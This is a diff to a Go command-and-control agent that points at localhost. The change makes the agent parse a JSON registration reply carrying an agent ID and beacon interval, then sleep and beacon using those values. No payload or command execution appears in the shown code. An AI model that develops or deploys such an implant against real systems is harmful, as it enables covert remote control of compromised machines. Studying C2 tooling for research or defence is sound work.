@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"io"
 	"log"
@@ -14,9 +15,12 @@ import (
 var c2server = "localhost"
 var c2serverport = "8080"
 
+type RegisterResponse struct {
+	AgentId  string `json:"agentId"`
+	Interval int    `json:"interval"`
+}
+
 func main() {
-	agentId := ""
-	sleep := 60
 	c2register := "http://" + c2server + ":" + c2serverport + "/register"
 	register_resp, err := http.Get(c2register)
 
@@ -27,15 +31,20 @@ func main() {
 	defer register_resp.Body.Close()
 
 	body, err := io.ReadAll(register_resp.Body)
-	agentId = string(body)
+	var registerResponse RegisterResponse
+	err = json.Unmarshal(body, &registerResponse)
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println("[+] Agent ID:", agentId)
+
+	agentId := registerResponse.AgentId
+	interval := registerResponse.Interval
+	fmt.Println("[*] Agent ID: " + agentId)
+	fmt.Println("[*] Interval: " + fmt.Sprint(interval))
 loop:
 	for {
-		fmt.Printf("[*] Sleeping for %v seconds", sleep)
-		time.Sleep(time.Duration(sleep) * time.Second)
+		fmt.Printf("[*] Sleeping for %v seconds", interval)
+		time.Sleep(time.Duration(interval) * time.Second)
 		data := url.Values{
 			"agentId": {agentId},
 		}
